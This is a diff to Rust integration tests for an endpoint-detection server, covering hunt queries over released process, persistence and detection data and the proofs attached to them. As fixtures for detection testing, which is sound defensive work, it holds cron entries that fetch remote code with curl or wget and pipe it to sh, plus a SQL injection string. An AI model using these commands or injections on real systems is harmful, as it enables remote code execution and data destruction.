@@ -8,7 +8,6 @@ use sqlx::sqlite::{SqlitePool, SqlitePoolOptions};
 use std::collections::BTreeMap;
 use std::sync::Arc;
 use tower::ServiceExt;
-use zedr_control_server::hunt::Described;
 use zedr_control_server::proofs::{ReceiptVerifier, Verified};
 use zedr_ledger::{leaf, seal, Hash, WindowHeader, GENESIS};
 use zedr_protocol::{
@@ -2496,6 +2495,10 @@ fn quiet(pid: u32) -> SensorEvent {
     started(u64::from(pid), pid, 1, "/usr/bin/sleep", &["60"])
 }
 
+fn ended(timestamp: u64, pid: u32) -> SensorEvent {
+    SensorEvent::Process(ProcessEvent { timestamp, pid, ppid: 0, executable_path: String::new(), command_line: Vec::new(), action: ProcessAction::Terminate, uid: 0, hash: None })
+}
+
 fn connected(timestamp: u64, pid: u32, port: u16) -> SensorEvent {
     SensorEvent::Network(NetworkEvent {
         timestamp,
@@ -2818,17 +2821,6 @@ async fn tables_holding(pool: &SqlitePool, needle: &str) -> Vec<String> {
     holding
 }
 
-/// Puts events into the hunt index the way the server does for an event that was opened on its own
-async fn index_opened(pool: &SqlitePool, agent_id: &str, events: &[SensorEvent]) {
-    for event in events {
-        let described = match event {
-            SensorEvent::Process(process) => Some(Described::new(process, None, process.timestamp)),
-            _ => None,
-        };
-        zedr_control_server::hunt::index(pool, agent_id, event, described.as_ref()).await.unwrap();
-    }
-}
-
 async fn detection_incidents(pool: &SqlitePool, agent_id: &str) -> Vec<String> {
     let mut types = open_incidents(pool, agent_id).await;
     types.retain(|incident_type| incident_type.starts_with("detection."));
@@ -2992,7 +2984,9 @@ async fn test_hunting_finds_a_process_tree_shape_on_every_endpoint_that_released
     assert_eq!(hunt_total(&app, "detection where rule = hidden-window or rule = shell-network").await, 4);
     assert_eq!(hunt_total(&app, "process where pid >= 2600 and pid < 2700").await, 4);
     assert_eq!(hunt_total(&app, "process where name = winword.exe and parent.name = explorer.exe").await, 0, "a parent that was only opened as context is known without its own parent");
-    assert_eq!(hunt_total(&app, "process where grandparent.name = winword.exe").await, 0, "nothing tells the server a grandparent any more");
+    let (status, refused) = hunt(&app, Some(&reader), "process where grandparent.name = winword.exe").await;
+    assert_eq!(status, StatusCode::BAD_REQUEST, "no release tells the server a grandparent, so there is no such field");
+    assert!(refused["error"].as_str().unwrap().starts_with("process has no field grandparent.name"));
     assert_eq!(hunt_total(&app, "process where command ~ npm or name = cmd.exe or name = buildagent.exe").await, 0, "what no rule released cannot be hunted");
     assert_eq!(count(&pool, "SELECT COUNT(*) FROM hunt_processes WHERE agent_id = ?", "hunt-clean").await, 0);
 
@@ -3002,9 +2996,11 @@ async fn test_hunting_finds_a_process_tree_shape_on_every_endpoint_that_released
     let (status, fields) = call(&app, "GET", "/api/admin/hunt/fields", Some(&reader), None).await;
     assert_eq!(status, StatusCode::OK);
     let process = fields.as_array().unwrap().iter().find(|entity| entity["name"] == "process").unwrap();
-    for field in ["name", "parent.name", "grandparent.name", "running", "host"] {
+    for field in ["name", "parent.name", "parent.path", "running", "host"] {
         assert!(process["fields"].as_array().unwrap().iter().any(|listed| listed == field), "process lists {}", field);
     }
+    let kinds: Vec<&str> = fields.as_array().unwrap().iter().map(|entity| entity["name"].as_str().unwrap()).collect();
+    assert_eq!(kinds, ["process", "connection", "file", "detection", "persistence"]);
 }
 
 #[tokio::test]
@@ -3023,6 +3019,10 @@ async fn test_a_hunt_query_that_cannot_be_read_says_why_and_runs_nothing() {
     assert_eq!(status, StatusCode::BAD_REQUEST);
     assert!(refused["error"].as_str().unwrap().contains("Fields: name, path, command"));
 
+    let (status, refused) = hunt(&app, Some(&reader), "package where name = openssl").await;
+    assert_eq!(status, StatusCode::BAD_REQUEST, "no rule opens a package, so there is none to hunt");
+    assert_eq!(refused["error"], "Start with process, connection, file, detection or persistence");
+
     let injection = r#"process where name = "x' OR 1=1; DELETE FROM agents; --""#;
     assert_eq!(hunt_total(&app, injection).await, 0);
     let agents: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM agents").fetch_one(&pool).await.unwrap();
@@ -3030,66 +3030,155 @@ async fn test_a_hunt_query_that_cannot_be_read_says_why_and_runs_nothing() {
 }
 
 #[tokio::test]
-async fn test_hunting_knows_which_processes_have_ended() {
+async fn test_the_end_of_a_process_with_a_finding_is_opened_and_ends_its_hunt_row() {
     let (app, pool) = create_test_app_with_pool().await;
-    enroll(&app, &pool, "hunt-ended").await;
-    let ended = SensorEvent::Process(ProcessEvent { timestamp: 900, pid: 41, ppid: 0, executable_path: String::new(), command_line: Vec::new(), action: ProcessAction::Terminate, uid: 0, hash: None });
-    index_opened(&pool, "hunt-ended", &[started(800, 41, 1, "/usr/bin/curl", &["-s", "http://203.0.113.9/a"]), started(810, 42, 1, "/usr/bin/sleep", &["60"]), ended]).await;
+    let mut host = enroll_endpoint(&app, &pool, "ending-host").await;
+    let (nginx, shell) = nginx_and_its_shell();
+    host.deliver(&app, &[nginx, shell, quiet(30)]).await;
+    assert_eq!(hunt_total(&app, "process where running = true").await, 2, "the shell and its parent");
 
-    assert_eq!(hunt_total(&app, "process where name = curl and running = false").await, 1);
-    assert_eq!(hunt_total(&app, "process where name = curl and running = true").await, 0);
-    assert_eq!(hunt_total(&app, "process where running = true").await, 1);
+    host.deliver(&app, &[ended(40, 30), ended(41, 21), ended(42, 20), ended(43, 21)]).await;
+
+    assert_eq!(hunt_total(&app, "process where name = sh and running = false").await, 1);
+    assert_eq!(hunt_total(&app, "process where name = sh and running = true").await, 0);
+    assert_eq!(hunt_total(&app, "process where name = nginx and running = true").await, 1, "the end of a process without a finding of its own stays sealed");
+    assert_eq!(count(&pool, "SELECT ended_at FROM hunt_processes WHERE agent_id = ? AND pid = 21", "ending-host").await, 41);
+
+    assert_eq!(findings(&pool, "ending-host").await.len(), 1, "the end of a process is no finding");
+    assert_eq!(open_incidents(&pool, "ending-host").await, vec!["detection.server-child"]);
+    let releases: Vec<(String, i64, String, i64, i64, bool)> =
+        sqlx::query_as("SELECT rule, trigger_idx, context, pid, started_at, finding_event_id IS NULL FROM releases WHERE agent_id = 'ending-host' ORDER BY trigger_idx").fetch_all(&pool).await.unwrap();
+    assert_eq!(releases, [("server-child".to_string(), 1, "[0]".to_string(), 21, 2, false), ("flagged-process-ended".to_string(), 4, "[1]".to_string(), 21, 2, true)]);
+
+    let opened: Vec<i64> = sqlx::query_scalar("SELECT idx FROM sealed_events WHERE agent_id = 'ending-host' AND opened_at IS NOT NULL ORDER BY idx").fetch_all(&pool).await.unwrap();
+    assert_eq!(opened, [0, 1, 4], "only the end of the shell is opened, and the event it entered with was open already");
+    let stored: Vec<String> = sqlx::query_scalar("SELECT data FROM events WHERE agent_id = 'ending-host' AND event_type = 'process' ORDER BY rowid").fetch_all(&pool).await.unwrap();
+    assert_eq!(stored.len(), 3);
+    assert_eq!(serde_json::from_str::<serde_json::Value>(&stored[2]).unwrap(), stored_form(&ended(41, 21)));
+
+    let (status, window) = call(&app, "GET", "/api/admin/agents/ending-host/windows/1", Some(&admin_token("user")), None).await;
+    assert_eq!(status, StatusCode::OK);
+    assert_eq!(
+        window["releases"],
+        serde_json::json!([{ "trigger": 4, "rule": "flagged-process-ended", "title": "Process with a finding ended", "technique": "", "level": "info", "context": [1], "proven": false }])
+    );
+
+    let mut late = enroll_endpoint(&app, &pool, "ending-late-host").await;
+    let (nginx, shell) = nginx_and_its_shell();
+    let mut window = late.ledger.seal(&[nginx, shell]);
+    window.releases.clear();
+    assert_eq!(late.send(&app, window).await.0, StatusCode::OK);
+    late.deliver(&app, &[ended(41, 21)]).await;
+    let row: (String, Option<String>, i64, i64) = sqlx::query_as("SELECT name, parent_name, started_at, ended_at FROM hunt_processes WHERE agent_id = 'ending-late-host'").fetch_one(&pool).await.unwrap();
+    assert_eq!(row, ("sh".to_string(), None, 2, 41), "an end that opens the process itself tells the process first and then its end");
+    assert!(findings(&pool, "ending-late-host").await.is_empty() && open_incidents(&pool, "ending-late-host").await.is_empty());
 }
 
 #[tokio::test]
-async fn test_hunting_finds_every_endpoint_with_an_old_version_of_a_package() {
+async fn test_a_release_of_the_end_of_a_process_that_does_not_hold_is_refused() {
     let (app, pool) = create_test_app_with_pool().await;
-    for agent_id in ["package-old", "package-patched", "package-alpine"] {
-        enroll(&app, &pool, agent_id).await;
+    type Change = fn(&mut Release, &TestLedger);
+    let cases: [(&str, Change); 7] = [
+        ("a trigger that is not the end of a process", |release, ledger| {
+            release.trigger = 2;
+            release.openings[0] = ledger.opening(2);
+        }),
+        ("no event the process entered with", |release, _| {
+            release.context.clear();
+            release.openings.truncate(1);
+        }),
+        ("another process than its events show", |release, _| release.pid = 99),
+        ("the end of another process", |release, ledger| {
+            release.trigger = 4;
+            release.openings[0] = ledger.opening(4);
+        }),
+        ("the entry of another process", |release, ledger| {
+            release.context = vec![0];
+            release.openings[1] = ledger.opening(0);
+        }),
+        ("an end where the process should enter", |release, ledger| {
+            *release = Release { trigger: 4, rule: release.rule.clone(), context: vec![3], pid: 31, started_at: 31, openings: vec![ledger.opening(4), ledger.opening(3)] };
+        }),
+        ("a rule that finds something, on the end of a process", |release, _| release.rule = "server-child".to_string()),
+    ];
+
+    for (number, (case, change)) in cases.into_iter().enumerate() {
+        let agent_id = format!("ending-release-host-{}", number);
+        let mut host = enroll_endpoint(&app, &pool, &agent_id).await;
+        let (nginx, shell) = nginx_and_its_shell();
+        host.deliver(&app, &[nginx, shell]).await;
+
+        let mut window = host.ledger.seal(&[quiet(31), ended(41, 21), ended(42, 31)]);
+        assert_eq!(window.releases.iter().map(|release| (release.rule.as_str(), release.trigger, release.context.as_slice())).collect::<Vec<_>>(), [("flagged-process-ended", 3, [1].as_slice())]);
+        change(&mut window.releases[0], &host.ledger);
+        let (status, ack) = host.send(&app, window).await;
+        assert_eq!(status, StatusCode::OK, "{}: the window itself is held, {}", case, ack);
+
+        assert_eq!(open_incidents(&pool, &agent_id).await, vec!["detection.server-child", "release_invalid"], "{}", case);
+        assert_eq!(count(&pool, "SELECT COUNT(*) FROM sealed_events WHERE agent_id = ? AND opened_at IS NOT NULL", &agent_id).await, 2, "{}: nothing more is opened", case);
+        assert_eq!(count(&pool, "SELECT COUNT(*) FROM events WHERE agent_id = ? AND event_type = 'process'", &agent_id).await, 2, "{}", case);
+        assert_eq!(count(&pool, "SELECT COUNT(*) FROM releases WHERE agent_id = ?", &agent_id).await, 1, "{}", case);
+        assert_eq!(count(&pool, "SELECT COUNT(*) FROM hunt_processes WHERE agent_id = ? AND ended_at IS NOT NULL", &agent_id).await, 0, "{}: no process is taken for ended", case);
     }
-    let dpkg = |action, name, version, previous| package(action, PackageManager::Dpkg, name, version, previous);
-    index_opened(&pool, "package-old", &[dpkg(InventoryAction::Present, "openssl", "3.0.13-0ubuntu3", None), dpkg(InventoryAction::Present, "bash", "5.2.21-2ubuntu4", None)]).await;
-    index_opened(&pool, "package-patched", &[dpkg(InventoryAction::Present, "openssl", "3.0.14-1", None)]).await;
-    index_opened(&pool, "package-alpine", &[package(InventoryAction::Present, PackageManager::Apk, "openssl", "3.0.9-r1", None)]).await;
-
-    let (status, result) = hunt(&app, Some(&admin_token("user")), "package where name = openssl and version < 3.0.14").await;
-    assert_eq!(status, StatusCode::OK, "{}", result);
-    let mut hosts: Vec<&str> = result["endpoints"].as_array().unwrap().iter().map(|endpoint| endpoint["agent_id"].as_str().unwrap()).collect();
-    hosts.sort_unstable();
-    assert_eq!(hosts, ["package-alpine", "package-old"], "3.0.9 is older than 3.0.14 although it sorts after it as text");
-    assert_eq!(result["columns"], serde_json::json!(["package", "version", "was", "manager", "arch"]));
-
-    assert_eq!(hunt_total(&app, "package where name = openssl and version >= 3.0.14").await, 1);
-    assert_eq!(hunt_total(&app, "package where name = openssl and manager = apk").await, 1);
-    assert_eq!(hunt_total(&app, "package where name = openssl").await, 3);
-
-    index_opened(&pool, "package-old", &[dpkg(InventoryAction::Changed, "openssl", "3.0.14-0ubuntu1", Some("3.0.13-0ubuntu3"))]).await;
-    assert_eq!(hunt_total(&app, "package where name = openssl and version < 3.0.14").await, 1, "an upgrade replaces the version it had");
-    assert_eq!(hunt_total(&app, r#"package where previous = "3.0.13-0ubuntu3""#).await, 1);
-
-    index_opened(&pool, "package-alpine", &[package(InventoryAction::Removed, PackageManager::Apk, "openssl", "3.0.9-r1", None)]).await;
-    assert_eq!(hunt_total(&app, "package where name = openssl and version < 3.0.14").await, 0, "a removed package is no longer installed");
-    assert_eq!(hunt_total(&app, "package where name = openssl").await, 2);
 }
 
 #[tokio::test]
-async fn test_hunting_reads_the_persistence_items_an_endpoint_has_now() {
+async fn test_a_proof_tells_whether_the_end_of_a_flagged_process_was_released() {
+    let (app, pool) = create_proving_app().await;
+    let (nginx, shell) = nginx_and_its_shell();
+
+    let mut honest = enroll_endpoint(&app, &pool, "ending-told-host").await;
+    honest.deliver(&app, &[nginx.clone(), shell.clone()]).await;
+    honest.deliver(&app, &[quiet(30), ended(41, 21)]).await;
+    let journal = honest.ledger.journal(2);
+    assert_eq!(journal.matches.iter().map(|found| found.rule.id()).collect::<Vec<_>>(), ["server-child", "flagged-process-ended"]);
+    assert_eq!(honest.prove(&app, &journal).await.0, StatusCode::OK);
+    assert_eq!(proof_states(&pool, "ending-told-host").await, ["verified", "verified"]);
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM releases WHERE agent_id = ? AND proven = 1", "ending-told-host").await, 2);
+    assert_eq!(open_incidents(&pool, "ending-told-host").await, vec!["detection.server-child"]);
+
+    let mut hiding = enroll_endpoint(&app, &pool, "ending-hidden-host").await;
+    hiding.deliver(&app, &[nginx, shell]).await;
+    let mut window = hiding.ledger.seal(&[quiet(30), ended(41, 21)]);
+    assert_eq!(window.releases.len(), 1);
+    window.releases.clear();
+    assert_eq!(hiding.send(&app, window).await.0, StatusCode::OK);
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM hunt_processes WHERE agent_id = ? AND pid = 21 AND ended_at IS NULL", "ending-hidden-host").await, 1, "the shell still looks alive");
+
+    let journal = hiding.ledger.journal(2);
+    assert_eq!(hiding.prove(&app, &journal).await.0, StatusCode::OK);
+    assert_eq!(open_incidents(&pool, "ending-hidden-host").await, vec!["detection.server-child", "match_not_released"]);
+    assert_eq!(
+        incident_evidence(&pool, "ending-hidden-host", "match_not_released").await["matches"],
+        serde_json::json!([{ "trigger": 3, "rule": "flagged-process-ended", "context": [1], "pid": 21, "started_at": 2 }])
+    );
+    assert_eq!(proof_states(&pool, "ending-hidden-host").await, ["mismatch", "mismatch"]);
+    assert_eq!(findings(&pool, "ending-hidden-host").await[0]["proof"], "verified", "the finding itself is told by the proof");
+}
+
+#[tokio::test]
+async fn test_hunting_reads_the_autostart_items_a_rule_released() {
     let (app, pool) = create_test_app_with_pool().await;
-    enroll(&app, &pool, "persistence-hunt").await;
-    let cron = |action| autostart(action, PersistenceKind::Cron, "fetch", "/etc/cron.d/fetch", "curl -s http://203.0.113.9/x | sh", None);
+    let mut host = enroll_endpoint(&app, &pool, "persistence-hunt").await;
+    let cron = |action, command: &str| autostart(action, PersistenceKind::Cron, "fetch", "/etc/cron.d/fetch", command, None);
     let unit = autostart(InventoryAction::Present, PersistenceKind::SystemdUnit, "ssh.service", "/usr/lib/systemd/system/ssh.service", "/usr/sbin/sshd -D", None);
-    index_opened(&pool, "persistence-hunt", &[cron(InventoryAction::Added), unit]).await;
+    host.deliver(&app, &[cron(InventoryAction::Added, "curl -s http://203.0.113.9/x | sh"), unit]).await;
 
-    assert_eq!(hunt_total(&app, "persistence where kind = cron and command ~ curl").await, 1);
-    assert_eq!(hunt_total(&app, "persistence where enabled = true").await, 2);
-    assert_eq!(hunt_total(&app, "persistence where kind in (systemd_unit, systemd_timer) and user = root").await, 1);
+    assert_eq!(hunt_total(&app, "persistence where kind = cron and command ~ curl and user = root").await, 1);
+    assert_eq!(hunt_total(&app, "persistence where enabled = true").await, 1, "the unit no rule matched is not there to hunt");
+    assert_eq!(hunt_total(&app, "persistence where kind in (systemd_unit, systemd_timer)").await, 0);
 
-    index_opened(&pool, "persistence-hunt", &[cron(InventoryAction::Changed)]).await;
+    host.deliver(&app, &[cron(InventoryAction::Changed, "wget -qO- http://203.0.113.9/y | sh")]).await;
     assert_eq!(hunt_total(&app, "persistence where kind = cron").await, 1, "a changed item is the same item");
+    assert_eq!(hunt_total(&app, "persistence where command ~ wget").await, 1);
 
-    index_opened(&pool, "persistence-hunt", &[cron(InventoryAction::Removed)]).await;
-    assert_eq!(hunt_total(&app, "persistence where kind = cron").await, 0);
-    assert_eq!(hunt_total(&app, "persistence where enabled = true").await, 1, "the unit is still there");
+    let mut window = host.ledger.seal(&[cron(InventoryAction::Removed, "wget -qO- http://203.0.113.9/y | sh")]);
+    assert!(window.releases.is_empty(), "no rule reads an item that is gone");
+    window.releases.push(Release { trigger: 3, rule: "autostart-fetch".to_string(), context: Vec::new(), pid: 0, started_at: 1794780000, openings: vec![host.ledger.opening(3)] });
+    assert_eq!(host.send(&app, window).await.0, StatusCode::OK);
+    assert!(open_incidents(&pool, "persistence-hunt").await.contains(&"release_invalid".to_string()), "and a release that claims one did is refused");
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM sealed_events WHERE agent_id = ? AND opened_at IS NOT NULL", "persistence-hunt").await, 2);
+    assert_eq!(hunt_total(&app, "persistence where kind = cron").await, 1, "the removal stays sealed, so the item is listed as it was last released");
 }
 
 #[tokio::test]
@@ -3561,7 +3650,7 @@ async fn test_quiet_events_never_reach_any_table_in_plaintext() {
         "the search does find what a rule released"
     );
 
-    for query in [format!("process where command ~ \"{}\"", quiet_marker), format!("file where path ~ \"{}\"", quiet_marker), format!("persistence where name ~ \"{}\"", quiet_marker), format!("package where name ~ \"{}\"", quiet_marker)] {
+    for query in [format!("process where command ~ \"{}\"", quiet_marker), format!("file where path ~ \"{}\"", quiet_marker), format!("persistence where name ~ \"{}\"", quiet_marker)] {
         assert_eq!(hunt_total(&app, &query).await, 0, "{}", query);
     }
     let (_, listed) = call(&app, "GET", "/api/admin/events?agent_id=private-host&limit=1000", Some(&admin_token("user")), None).await;
@@ -4231,6 +4320,11 @@ async fn test_the_console_reads_the_rules_and_the_proof_programs_the_server_acce
     );
     assert_eq!((&rule("shell-network")["opens"], &rule("shell-network")["level"], &rule("shell-network")["releases"]), (&serde_json::json!("event, process and parent"), &serde_json::json!("medium"), &serde_json::json!(1)));
     assert_eq!((&rule("root-key-added")["opens"], &rule("root-key-added")["releases"]), (&serde_json::json!("autostart item"), &serde_json::json!(0)));
+    assert_eq!(
+        rule("flagged-process-ended"),
+        &serde_json::json!({ "id": "flagged-process-ended", "title": "Process with a finding ended", "technique": "", "level": "info", "opens": "end of the process and the process", "releases": 0 }),
+        "a rule that only follows up on a finding has no technique"
+    );
     assert_eq!(rules.iter().map(|rule| rule["releases"].as_i64().unwrap()).sum::<i64>(), 7);
 
     let (default_app, _) = create_test_app_with_pool().await;
